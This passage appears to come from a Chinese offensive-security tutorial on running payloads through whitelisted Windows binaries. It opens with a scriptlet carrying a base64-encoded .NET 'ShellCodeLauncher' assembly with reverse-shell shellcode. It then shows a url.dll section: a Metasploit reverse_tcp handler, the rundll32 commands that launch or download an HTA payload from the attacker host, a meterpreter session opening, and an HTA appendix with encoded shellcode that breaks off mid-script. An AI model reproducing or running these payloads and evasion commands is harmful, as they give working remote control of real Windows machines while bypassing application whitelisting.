<span class="token string">"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"</span><span class="token operator">+</span>
<span class="token string">"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"</span><span class="token operator">+</span>
<span class="token string">"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"</span><span class="token operator">+</span>
<span class="token string">"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"</span><span class="token operator">+</span>
<span class="token string">"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"</span><span class="token operator">+</span>
<span class="token string">"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"</span><span class="token operator">+</span>
<span class="token string">"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"</span><span class="token operator">+</span>
<span class="token string">"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"</span><span class="token operator">+</span>
<span class="token string">"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"</span><span class="token operator">+</span>
<span class="token string">"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"</span><span class="token operator">+</span>
<span class="token string">"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"</span><span class="token operator">+</span>
<span class="token string">"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"</span><span class="token operator">+</span>
<span class="token string">"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"</span><span class="token operator">+</span>
<span class="token string">"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"</span><span class="token operator">+</span>
<span class="token string">"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"</span><span class="token operator">+</span>
<span class="token string">"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"</span><span class="token operator">+</span>
<span class="token string">"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"</span><span class="token operator">+</span>
<span class="token string">"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"</span><span class="token operator">+</span>
<span class="token string">"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"</span><span class="token operator">+</span>
<span class="token string">"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAYaVEXAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAA8AAiIAsCCwAADAAAAAQAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAJgCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAATAoAAAAgAAAADAAAAAIAAAAAAAAAAAAAAAAAACAA"</span><span class="token operator">+</span>
<span class="token string">"AGAucnNyYwAAAJgCAAAAQAAAAAQAAAAOAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAAAAAAAGAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAEgAAAAAAAAAAAAAAAAAAQAAAQkgAAAACAAUA7CIAAGAHAAABAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA"</span><span class="token operator">+</span>
 <span class="token string">"KAIAAAYAACoAAAAAAAAA/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pK"</span><span class="token operator">+</span>
<span class="token string">"TTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0"</span><span class="token operator">+</span>
<span class="token string">"Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhE"</span><span class="token operator">+</span>
<span class="token string">"i0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS///"</span><span class="token operator">+</span>
 <span class="token string">"/11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAA1wKgBBEFUSYnkTInxQbpMdyYH/9VMiepo"</span><span class="token operator">+</span>
<span class="token string">"AQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ"</span><span class="token operator">+</span>
<span class="token string">"+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8Qg"</span><span class="token operator">+</span>
<span class="token string">"Xon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gA"</span><span class="token operator">+</span>
<span class="token string">"fShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dY"</span><span class="token operator">+</span>
<span class="token string">"agBZScfC8LWiVv/VAAATMAYAZQAAAAEAABEAIP4BAACNBgAAASXQAwAABCgGAAAKChYGjml+AQAA"</span><span class="token operator">+</span>
<span class="token string">"BH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMoBAAA"</span><span class="token operator">+</span>
<span class="token string">"BgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMx"</span><span class="token operator">+</span>
<span class="token string">"OQAAAAAFAGwAAABgAgAAI34AAMwCAABIAwAAI1N0cmluZ3MAAAAAFAYAAAgAAAAjVVMAHAYAABAA"</span><span class="token operator">+</span>
<span class="token string">"AAAjR1VJRAAAACwGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAADwAA"</span><span class="token operator">+</span>
<span class="token string">"AAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAABAAAA"</span><span class="token operator">+</span>
<span class="token string">"AQAAAAAACgABAAAAAAAGAD0ANgAGAE0BMQEGAGkBMQEGAJgBeAEGALgBeAEGANsBNgAGACUCeAEG"</span><span class="token operator">+</span>
<span class="token string">"AEACNgAGAHwCeAEGAIsCNgAGAJECNgAGALQCNgAGAOYCxwIGAPgCxwIGACsDGwMAAAAAAQAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AQABAAEAEAATABsABQABAAEAAAAAAOABAAAFAAMABwATAQAASgIAACEABAAHABEATwASABEAWgAS"</span><span class="token operator">+</span>
<span class="token string">"ABMBaAI+AFAgAAAAAIYYRAAKAAEAaCIAAAAAkQBKAA4AAQAAAAAAgACRIHEAFQABAAAAAACAAJEg"</span><span class="token operator">+</span>
<span class="token string">"fgAdAAUAAAAAAIAAkSCLACgACwDZIgAAAACRGBQDDgANAAAAAQCfAAAAAgCrAAAAAwCwAAAABADB"</span><span class="token operator">+</span>
<span class="token string">"AAAAAQDLAAAAAgDeAAAAAwDqAAAABAD5AAAABQD/AAAABgAPAQAAAQAaAQAAAgAiAREARAAuACEA"</span><span class="token operator">+</span>
<span class="token string">"RAA0ACkARAAKAAkARAAKADkARAAKAEkApAJCAGEAuwJKAGkA7gJPAGEA8wJYAHEARABkAHkARAAK"</span><span class="token operator">+</span>
<span class="token string">"ACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEA/gEAAAQAWwALAwABBwBxAAEAAAEJAH4A"</span><span class="token operator">+</span>
<span class="token string">"AQAAAQsAiwABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAANYBAAAEAAAAAAAAAAAAAAABAC0AAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAQAAwAAAAA8TW9kdWxlPgAyMjIyLmRsbABQcm9ncmFtAFNoZWxsQ29kZUxhdW5jaGVyAG1zY29y"</span><span class="token operator">+</span>
<span class="token string">"bGliAFN5c3RlbQBPYmplY3QALmN0b3IATWFpbgBNRU1fQ09NTUlUAFBBR0VfRVhFQ1VURV9SRUFE"</span><span class="token operator">+</span>
<span class="token string">"V1JJVEUAVmlydHVhbEFsbG9jAENyZWF0ZVRocmVhZABXYWl0Rm9yU2luZ2xlT2JqZWN0AGxwU3Rh"</span><span class="token operator">+</span>
<span class="token string">"cnRBZGRyAHNpemUAZmxBbGxvY2F0aW9uVHlwZQBmbFByb3RlY3QAbHBUaHJlYWRBdHRyaWJ1dGVz"</span><span class="token operator">+</span>
<span class="token string">"AGR3U3RhY2tTaXplAGxwU3RhcnRBZGRyZXNzAHBhcmFtAGR3Q3JlYXRpb25GbGFncwBscFRocmVh"</span><span class="token operator">+</span>
<span class="token string">"ZElkAGhIYW5kbGUAZHdNaWxsaXNlY29uZHMAU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zAFNl"</span><span class="token operator">+</span>
<span class="token string">"Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZQBTZWN1cml0eUFjdGlvbgBTeXN0ZW0uUnVudGltZS5D"</span><span class="token operator">+</span>
<span class="token string">"b21waWxlclNlcnZpY2VzAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNv"</span><span class="token operator">+</span>
<span class="token string">"bXBhdGliaWxpdHlBdHRyaWJ1dGUAMjIyMgBCeXRlADxQcml2YXRlSW1wbGVtZW50YXRpb25EZXRh"</span><span class="token operator">+</span>
<span class="token string">"aWxzPntBODMyQkQ0MS1EQjgyLTQ0NzEtOEMxRC1BMDlBNDFCQjAzRER9AENvbXBpbGVyR2VuZXJh"</span><span class="token operator">+</span>
<span class="token string">"dGVkQXR0cmlidXRlAFZhbHVlVHlwZQBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTUxMAAkJG1l"</span><span class="token operator">+</span>
<span class="token string">"dGhvZDB4NjAwMDAwMi0xAFJ1bnRpbWVIZWxwZXJzAEFycmF5AFJ1bnRpbWVGaWVsZEhhbmRsZQBJ"</span><span class="token operator">+</span>
<span class="token string">"bml0aWFsaXplQXJyYXkASW50UHRyAG9wX0V4cGxpY2l0AFN5c3RlbS5SdW50aW1lLkludGVyb3BT"</span><span class="token operator">+</span>
<span class="token string">"ZXJ2aWNlcwBNYXJzaGFsAENvcHkAWmVybwBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIALmNj"</span><span class="token operator">+</span>
<span class="token string">"dG9yAFN5c3RlbS5TZWN1cml0eQBVbnZlcmlmaWFibGVDb2RlQXR0cmlidXRlAAAAAAADIAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"Qb0yqILbcUSMHaCaQbsD3QAIt3pcVhk04IkDIAABAwAAAQIGCQcABAkJCQkJCgAGGAkJCRgJEAkF"</span><span class="token operator">+</span>
<span class="token string">"AAIJGAkFIAEBEQ0EIAEBCAQBAAAAAwYREAcAAgESKREtBAABGAoIAAQBHQUIGAgCBhgIBwUdBQkY"</span><span class="token operator">+</span>
<span class="token string">"CRgEIAEBDggBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwGAni4BgIRTeXN0"</span><span class="token operator">+</span>
<span class="token string">"ZW0uU2VjdXJpdHkuUGVybWlzc2lvbnMuU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlLCBtc2Nv"</span><span class="token operator">+</span>
<span class="token string">"cmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3"</span><span class="token operator">+</span>
<span class="token string">"N2E1YzU2MTkzNGUwODkVAVQCEFNraXBWZXJpZmljYXRpb24BAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAA8AgAAAAAAAAAAAAA8AjQAAABW"</span><span class="token operator">+</span>
<span class="token string">"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEnAEAAAEAUwB0AHIAaQBuAGcA"</span><span class="token operator">+</span>
<span class="token string">"RgBpAGwAZQBJAG4AZgBvAAAAeAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE"</span><span class="token operator">+</span>
<span class="token string">"AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A"</span><span class="token operator">+</span>
<span class="token string">"AAAAADAALgAwAC4AMAAuADAAAAA0AAkAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAADIAMgAy"</span><span class="token operator">+</span>
<span class="token string">"ADIALgBkAGwAbAAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAADwA"</span><span class="token operator">+</span>
<span class="token string">"CQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAAAyADIAMgAyAC4AZABsAGwAAAAA"</span><span class="token operator">+</span>
<span class="token string">"ADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAA4AAgA"</span><span class="token operator">+</span>
<span class="token string">"AQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm"</span><span class="token operator">+</span>
<span class="token string">"bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA"</span><span class="token punctuation">;</span>
 var entry_class <span class="token operator">=</span> <span class="token string">'ShellCodeLauncher.Program'</span><span class="token punctuation">;</span> 

try <span class="token punctuation">{</span>
<span class="token function">setversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var stm <span class="token operator">=</span> <span class="token function">base64ToStream</span><span class="token punctuation">(</span>serialized_obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
var fmt <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var al <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">'System.Collections.ArrayList'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var d <span class="token operator">=</span> fmt<span class="token punctuation">.</span><span class="token function">Deserialize_2</span><span class="token punctuation">(</span>stm<span class="token punctuation">)</span><span class="token punctuation">;</span>
al<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>undefined<span class="token punctuation">)</span><span class="token punctuation">;</span>
var o <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">DynamicInvoke</span><span class="token punctuation">(</span>al<span class="token punctuation">.</span><span class="token function">ToArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>entry_class<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> catch <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token function">debug</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> 
<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>registration<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>scriptlet<span class="token operator">&gt;</span>
</code></pre>
<hr>
<h2><a id="1118_Urldllpayload_2702"></a>11.18 基于白名单Url.dll执行payload（十七）</h2>
<p><strong>Url.dll简介：</strong></p>
<p>url.dll是Internet快捷壳扩展相关应用程序接口系统文件。</p>
<p>说明：url.dll所在路径已被系统添加PATH环境变量中，因此，url.dll命令可识别，但由于为dll文件，需调用rundll32.exe来执行。</p>
<p><strong>Windows 2003 默认位置：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\url<span class="token punctuation">.</span>dll
C<span class="token punctuation">:</span>\Windows\SysWOW64\url<span class="token punctuation">.</span>dll
</code></pre>
<p><strong>Windows 7 默认位置：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\url<span class="token punctuation">.</span>dll
C<span class="token punctuation">:</span>\Windows\SysWOW64\url<span class="token punctuation">.</span>dll
</code></pre>
<p>攻击机： 192.168.1.4 Debian<br>
靶机： 192.168.1.3 Windows 7</p>
<p><strong>配置攻击机msf：</strong></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options

Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span>

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span>

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>

LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>

LPORT <span class="token number">53</span> yes The listen port

Exploit target<span class="token punctuation">:</span>

Id Name
‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target

msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010233337338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<pre><code class="prism language-c">rundll32<span class="token punctuation">.</span>exe url<span class="token punctuation">.</span>dll<span class="token punctuation">,</span>FileProtocolHandler file<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>C<span class="token punctuation">:</span>\Users\John\Desktop\Micropoor_url_dll<span class="token punctuation">.</span>hta
</code></pre>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">5</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span><span class="token punctuation">:</span><span class="token number">5018</span><span class="token punctuation">)</span> at
<span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">21</span> <span class="token number">04</span><span class="token punctuation">:</span><span class="token number">41</span><span class="token punctuation">:</span><span class="token number">43</span> ‐<span class="token number">0500</span>

meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> John‐PC\John
meterpreter <span class="token operator">&gt;</span> getpid
Current pid<span class="token punctuation">:</span> <span class="token number">8584</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010233416610.png#pic_center" alt="在这里插入图片描述"><br>
同样可以调用url.dll下载payload：</p>
<pre><code class="prism language-c">rundll32<span class="token punctuation">.</span>exe url<span class="token punctuation">.</span>dll<span class="token punctuation">,</span>OpenURL http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token operator">/</span>Micropoor_url_dll<span class="token punctuation">.</span>hta
</code></pre>
<p>附录：Micropoor_url_dll.hta</p>
<pre><code class="prism language-visual">Dim binary : binary = "rundll32.exe"
Dim code : code = "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMH PDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7 fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfV GhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D/1Z dqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmo AaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8M JA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U="
Sub Debug(s) End Sub Sub SetVersion End Sub Function Base64ToStream(b) Dim enc, length, ba, transform, ms Set enc = CreateObject("System.Text.ASCIIEncoding") length = enc.GetByteCount_2(b) Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform") Set ms = CreateObject("System.IO.MemoryStream") ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3) ms.Position = 0 Set Base64ToStream = ms End Function Sub Run
Dim s, entry_class
